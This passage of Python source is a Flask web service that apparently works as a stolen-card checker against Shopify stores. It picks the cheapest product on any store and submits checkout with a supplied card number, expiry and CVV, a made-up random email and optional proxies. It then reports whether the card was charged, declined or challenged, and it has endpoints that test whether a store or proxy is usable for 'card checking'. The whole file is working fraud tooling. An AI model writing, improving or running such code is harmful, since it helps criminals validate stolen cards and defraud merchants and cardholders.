        try:
            r   = self.session.post(
                self._graphql_url(), json=payload,
                headers=self._graphql_headers(), timeout=30,
            )
            res = r.json()
        except Exception:
            return None, None

        sub = (res.get("data") or {}).get("submitForCompletion") or {}
        tn  = sub.get("__typename", "")

        # Fast-track: Shopify accepted immediately
        if tn in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
            receipt    = sub.get("receipt") or {}
            receipt_id = receipt.get("id")
            # Also try to extract handle in case it's in the receipt
            dl_handle  = self._extract_delivery_handle(receipt)
            return receipt_id, dl_handle

        # Extract delivery handle from receipt inside any response type
        receipt   = sub.get("receipt") or {}
        dl_handle = self._extract_delivery_handle(receipt)
        return None, dl_handle

    def _extract_delivery_handle(self, receipt):
        """Extract delivery strategy handle from a receipt object."""
        try:
            dl = receipt.get("deliveryLines") or []
            if dl:
                sel = dl[0].get("selectedDeliveryStrategy") or {}
                h   = sel.get("handle")
                if h:
                    return h
        except Exception:
            pass
        return None

    # ── step 8b: submit for completion ───────────────────────────────────────

    def submit(self, vault_id, addr, card_number=""):
        """
        Submit the checkout for payment processing.

        Flow for physical products:
          1. Negotiate delivery (get handle from Shopify).
          2. If negotiation returned a receipt_id directly → skip main submit.
          3. Otherwise submit with the delivery handle (or matchingConditions
             as fallback) and loop up to 12 times for Throttled responses.

        For digital products: single submit with noDeliveryRequired.
        """
        if not self.session_token:
            return None

        email         = (f"{addr['firstName'].lower()}"
                         f"{random.randint(10,99)}@gmail.com")
        attempt_token = (f"{self.checkout_id}-uaz"
                         f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=9))}")

        # ── Delivery negotiation (physical products only) ──────────────────
        delivery_handle    = None
        negotiated_receipt = None

        if self.requires_shipping:
            negotiated_receipt, delivery_handle = self._negotiate_delivery(
                vault_id, addr, email, attempt_token,
            )
            if negotiated_receipt:
                # Shopify fast-tracked: we already have a receipt to poll
                return negotiated_receipt

        # ── Main submit loop ───────────────────────────────────────────────
        payload = self._build_submit_payload(
            vault_id, addr, email,
            attempt_token=attempt_token,
            delivery_handle=delivery_handle,
            destination_changed=False,
        )

        for attempt_num in range(12):
            try:
                r   = self.session.post(
                    self._graphql_url(), json=payload,
                    headers=self._graphql_headers(), timeout=30,
                )
                res = r.json()
            except Exception:
                return None

            if "errors" in res and res.get("data") is None:
                return None

            sub = (res.get("data") or {}).get("submitForCompletion") or {}
            tn  = sub.get("__typename", "")

            if tn in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                return (sub.get("receipt") or {}).get("id")

            elif tn == "SubmitFailed":
                # reason is a string describing why submission was rejected
                return None

            elif tn == "Throttled":
                self.queue_token = sub.get("queueToken", self.queue_token)
                payload["variables"]["input"]["queueToken"] = self.queue_token
                time.sleep((sub.get("pollAfter") or 1000) / 1000.0)

            elif tn == "CheckpointDenied":
                return None

            elif tn in ("TooManyAttempts", "TooManyRequests"):
                return None

            elif tn == "SubmitRejected":
                codes = [e.get("code", "") for e in (sub.get("errors") or [])]

                if "WAITING_PENDING_TERMS" in codes:
                    time.sleep(0.5)
                    continue

                # Delivery negotiation failed → retry without a specific handle
                if any(c in _DELIVERY_ERROR_CODES for c in codes):
                    if delivery_handle is not None:
                        # We had a handle but it was wrong — retry without one
                        delivery_handle = None
                        payload = self._build_submit_payload(
                            vault_id, addr, email,
                            attempt_token=attempt_token,
                            delivery_handle=None,
                            destination_changed=True,
                        )
                        continue
                    return None   # delivery fundamentally unsupported for this site

                return None

            else:
                # Unknown typename — wait briefly and retry
                time.sleep(0.5)
                if attempt_num < 11:
                    continue
                return None

        return None

    # ── step 9: poll receipt ─────────────────────────────────────────────────

    def poll_receipt(self, receipt_id):
        """
        Poll Shopify until the receipt reaches a terminal state.
        Respects the pollDelay field from Shopify to avoid hammering the API.
        Terminal states: ProcessedReceipt, FailedReceipt, ActionRequiredReceipt,
                         ReceiptNotFound.
        Returns a tuple: (category, code, detail).
        """
        h = self._graphql_headers(streaming="no")

        next_wait = 2.0   # seconds — Shopify typically needs 3-15 s

        for _ in range(20):   # max ~60 s of polling
            time.sleep(next_wait)
            try:
                r = self.session.post(
                    self._graphql_url(),
                    json={
                        "query":         self.POLL_QUERY,
                        "operationName": "PollForReceipt",
                        "variables": {
                            "receiptId":    receipt_id,
                            "sessionToken": self.session_token,
                        },
                    },
                    headers=h,
                    timeout=30,
                )
                data    = r.json()
                receipt = (data.get("data") or {}).get("receipt") or {}
            except Exception:
                next_wait = min(next_wait + 1.0, 5.0)
                continue

            tn = receipt.get("__typename", "")

            # Respect Shopify's suggested retry delay
            shopify_delay = receipt.get("pollDelay")
            if shopify_delay:
                next_wait = float(shopify_delay) / 1000.0   # ms → s
            else:
                next_wait = min(next_wait + 0.5, 4.0)

            if tn == "ProcessedReceipt" or receipt.get("orderIdentity"):
                order_id = (receipt.get("orderIdentity") or {}).get("id", "N/A")
                return ("CHARGED", "SUCCESS", f"Order ID: {order_id}")

            elif tn == "FailedReceipt":
                err  = (receipt.get("processingError") or {})
                code = err.get("code", "UNKNOWN")
                desc = ERROR_DESCRIPTIONS.get(code, code)
                return ("DECLINED", code, desc)

            elif tn == "ActionRequiredReceipt":
                action = (receipt.get("action") or {})
                tn_action = action.get("__typename", "")

                if tn_action == "CompletePaymentChallenge":
                    url = action.get("url") or action.get("offsiteRedirect") or ""
                    return ("3DS_REQUIRED", "ACTION_REQUIRED", url or "3DS challenge required")

                elif tn_action == "CompletePaymentChallengeV2":
                    ctype = action.get("challengeType", "")
                    if ctype == "CAPTCHA":
                        return ("CAPTCHA_REQUIRED", "CAPTCHA_REQUIRED",
                                "CAPTCHA challenge required")
                    # Other v2 challenge (3DS, fingerprinting, …)
                    cdata_raw = action.get("challengeData", "")
                    try:
                        cdata = json.loads(cdata_raw)
                        url   = cdata.get("acsUrl") or cdata.get("url") or ""
                    except Exception:
                        url = ""
                    return ("3DS_REQUIRED", "ACTION_REQUIRED",
                            url or f"Challenge required: {ctype}")

                # Fallback for unknown action types
                return ("3DS_REQUIRED", "ACTION_REQUIRED", "Action required")

            elif tn in ("ProcessingReceipt", "WaitingReceipt"):
                continue   # next_wait already updated above

            elif tn == "ReceiptNotFound":
                return ("ERROR", "RECEIPT_NOT_FOUND", "Receipt not found")

            # Unknown typename — keep polling
            next_wait = min(next_wait + 1.0, 5.0)

        return ("ERROR", "TIMEOUT", "Polling timed out after maximum wait")

    # ── main entry point ─────────────────────────────────────────────────────

    def check_card(self, cc_line):
        """
        Run a full Shopify checkout for the given card line (cc|mm|yy|cvv).
        Returns a dict with keys: category, code, detail, price, site.
        """
        if not self.init_session():
            return {"category": "ERROR", "code": "SESSION_INIT_FAILED",
                    "detail": "Could not initialize session with the store",
                    "price": None}

        if not self.find_cheapest_product():
            return {"category": "ERROR", "code": "NO_PRODUCT",
                    "detail": "No available product found in the $0.50–$200 price range",
                    "price": None}

        if not self.add_to_cart():
            return {"category": "ERROR", "code": "CART_FAILED",
                    "detail": "Failed to add product to cart",
                    "price": None}

        self._monorail()

        try:
            self.session.get(f"{self.base_url}/cart",
                             headers=self.headers, timeout=10)
        except Exception:
            pass

        if not self.start_checkout():
            return {"category": "ERROR", "code": "CHECKOUT_FAILED",
                    "detail": "Failed to start checkout process",
                    "price": None}

        if not self.extract_tokens():
            return {"category": "ERROR", "code": "TOKEN_FAILED",
                    "detail": "Failed to extract session tokens from checkout page",
                    "price": None}

        vault_id, addr = self.vault_card(cc_line)
        if not vault_id:
            return {"category": "ERROR", "code": "VAULT_FAILED",
                    "detail": "Failed to vault card at payment processor",
                    "price": None}

        cc_number  = cc_line.split("|")[0].strip() if "|" in cc_line else ""
        receipt_id = self.submit(vault_id, addr, card_number=cc_number)

        if not receipt_id:
            return {"category": "DECLINED", "code": "SUBMISSION_REJECTED",
                    "detail": "Payment submission was rejected before processing",
                    "price": None}

        cat, code, detail = self.poll_receipt(receipt_id)
        return {
            "category": cat,
            "code":     code,
            "detail":   detail,
            "price":    self.product_price,
        }


# ── Flask routes ─────────────────────────────────────────────────────────────

@app.route("/shopify", methods=["GET"])
def shopify_check():
    """
    Run a full Shopify card check.

    Query params:
      site   — full store URL (required)
      cc     — card in format cc|mm|yy|cvv (required)
      proxy  — optional proxy string (ip:port or ip:port:user:pass or http://...)
    """
    site  = request.args.get("site", "").strip()
    cc    = request.args.get("cc",   "").strip()
    proxy = request.args.get("proxy", "").strip() or None

    if not site or not cc:
        return jsonify({
            "status": "error",
            "message": "Missing required parameters. Usage: /shopify?site=<url>&cc=cc|mm|yy|cvv",
        }), 400

    if "|" not in cc or len(cc.split("|")) != 4:
        return jsonify({
            "status": "error",
            "message": "Invalid cc format. Use: cardnumber|month|year|cvv",
        }), 400

    if proxy and not format_proxy(proxy):
        return jsonify({
            "status": "error",
            "message": f"Cannot parse proxy string: {proxy}",
        }), 400

    try:
        checker = ShopifyChecker(base_url=site, proxy=proxy)
        result  = checker.check_card(cc)
        return jsonify({
            "status": "success",
            "site":   site,
            "cc":     cc,
            "result": {
                "category": result["category"],
                "code":     result["code"],
                "detail":   result["detail"],
                "price":    result.get("price"),
            },
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/check_site", methods=["GET"])
def check_site():
    """
    Validate whether a URL is a live Shopify store with at least one purchasable product.

    Query params:
      site      — store URL (required)
      proxy     — optional proxy string
      min_price — minimum product price to look for (default: 0.5)
      max_price — maximum product price to look for (default: 200.0)

    Returns:
      ok        — true when the site is usable for card checking
      product   — name of the cheapest eligible product
      price     — price of that product
      requires_shipping — whether the product needs shipping
      error     — description when ok=false
    """
    site      = request.args.get("site", "").strip()
    proxy     = request.args.get("proxy", "").strip() or None
    min_price = float(request.args.get("min_price", 0.5))
    max_price = float(request.args.get("max_price", 200.0))

    if not site:
        return jsonify({"ok": False, "error": "Missing required parameter: site"}), 400

    if not site.startswith("http"):
        site = "https://" + site
    site = site.rstrip("/")

    if proxy and not format_proxy(proxy):
        return jsonify({"ok": False, "error": f"Cannot parse proxy string: {proxy}"}), 400

    proxies = {}
    if proxy:
        p = format_proxy(proxy)
        proxies = {"http": p, "https": p}

    try:
        sess = requests.Session()
        sess.verify = False
        if proxies:
            sess.proxies = proxies

        # 1. Hit /cart.js — confirms store is alive and Shopify
        try:
            r = sess.get(f"{site}/cart.js", timeout=12)
        except Exception as e:
            return jsonify({"ok": False, "site": site, "error": f"Cannot reach site: {e}"}), 200

        if r.status_code not in (200, 302):
            return jsonify({
                "ok":    False,
                "site":  site,
                "error": f"Site returned HTTP {r.status_code} on /cart.js",
            }), 200

        try:
            r.json()   # Shopify returns JSON from /cart.js
        except Exception:
            return jsonify({
                "ok":    False,
                "site":  site,
                "error": "Site is not a Shopify store (/cart.js did not return JSON)",
            }), 200

        # 2. Fetch products.json
        try:
            rp = sess.get(f"{site}/products.json", params={"limit": 250}, timeout=12)
            products = rp.json().get("products", [])
        except Exception:
            return jsonify({
                "ok":    False,
                "site":  site,
                "error": "Could not fetch products.json",
            }), 200

        if not products:
            return jsonify({
                "ok":    False,
                "site":  site,
                "error": "No products found on this store",
            }), 200

        # 3. Find cheapest eligible product
        best_price = float("inf")
        best_title = None
        best_req_ship = True

        for p in products:
            for v in p.get("variants", []):
                avail = v.get("available", False)
                if isinstance(avail, str):
                    avail = avail.lower() in ("true", "1", "yes")
                if not avail:
                    continue
                try:
                    pv = float(str(v.get("price", "0")).replace(",", ""))
                except (ValueError, TypeError):
                    continue
                if pv < min_price or pv > max_price:
                    continue
                if pv < best_price:
                    best_price = pv
                    best_title = p.get("title", "Unknown Product")
                    rs = v.get("requires_shipping", True)
                    if isinstance(rs, str):
                        rs = rs.lower() not in ("false", "0", "no")
                    best_req_ship = bool(rs)

        if best_title is None:
            return jsonify({
                "ok":    False,
                "site":  site,
                "error": (f"No available product found between "
                          f"${min_price:.2f} and ${max_price:.2f}"),
            }), 200

        return jsonify({
            "ok":               True,
            "site":             site,
            "product":          best_title,
            "price":            round(best_price, 2),
            "requires_shipping": best_req_ship,
            "error":            "",
        }), 200

    except Exception as e:
        return jsonify({"ok": False, "site": site, "error": str(e)[:200]}), 500


@app.route("/check_proxy", methods=["GET"])
def check_proxy():
    """
    Test whether a proxy is alive and working.

    Query params:
      proxy    — proxy string (required): ip:port | ip:port:user:pass | http://...
      test_url — URL to fetch through the proxy (default: https://api.ipify.org?format=json)

    Returns:
      ok       — true when the proxy connected and got a 200 response
      ip       — detected public IP (if test_url returns JSON with 'ip' or 'origin')
      latency  — round-trip time in milliseconds
      error    — description when ok=false
    """
    proxy_raw = request.args.get("proxy", "").strip()
    test_url  = request.args.get("test_url",
                                 "https://api.ipify.org?format=json").strip()

    if not proxy_raw:
        return jsonify({
            "ok":    False,
            "error": "Missing required parameter: proxy",
        }), 400

    proxy_fmt = format_proxy(proxy_raw)
    if not proxy_fmt:
        return jsonify({
            "ok":    False,
            "proxy": proxy_raw,
            "error": "Cannot parse proxy string. "
                     "Use: ip:port | ip:port:user:pass | http://user:pass@ip:port",
        }), 400

    try:
        sess = requests.Session()
        sess.verify  = False
        sess.proxies = {"http": proxy_fmt, "https": proxy_fmt}

        t0 = time.time()
        r  = sess.get(test_url, timeout=15)
        latency_ms = int((time.time() - t0) * 1000)

        if r.status_code == 200:
            detected_ip = ""
            try:
                body        = r.json()
                detected_ip = (body.get("ip") or body.get("origin")
                               or body.get("query") or "")
            except Exception:
                pass
            return jsonify({
                "ok":      True,
                "proxy":   proxy_fmt,
                "ip":      detected_ip,
                "latency": latency_ms,
                "error":   "",
            }), 200
        else:
            return jsonify({
                "ok":      False,
                "proxy":   proxy_fmt,
                "ip":      None,
                "latency": latency_ms,
                "error":   f"HTTP {r.status_code} from test URL",
            }), 200

    except requests.exceptions.ProxyError as e:
        return jsonify({
            "ok": False, "proxy": proxy_fmt, "ip": None, "latency": None,
            "error": f"Proxy error: {str(e)[:150]}",
        }), 200
    except requests.exceptions.ConnectTimeout:
        return jsonify({
            "ok": False, "proxy": proxy_fmt, "ip": None, "latency": None,
            "error": "Proxy timed out (15 s)",
        }), 200
    except Exception as e:
        return jsonify({
            "ok": False, "proxy": proxy_fmt, "ip": None, "latency": None,
            "error": str(e)[:150],
        }), 200


@app.route("/", methods=["GET"])
def health():
    """Health check — shows available endpoints."""
    return jsonify({
        "status":  "running",
        "version": "2.0.0",
        "endpoints": {
            "/shopify":     "Card check   — ?site=<url>&cc=cc|mm|yy|cvv[&proxy=]",
            "/check_site":  "Site check   — ?site=<url>[&proxy=][&min_price=][&max_price=]",
            "/check_proxy": "Proxy test   — ?proxy=<proxy>[&test_url=]",
            "/docs":        "Not available (pure REST API)",
        },
    }), 200


# ── Suppress InsecureRequestWarning (verify=False used intentionally) ────────
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
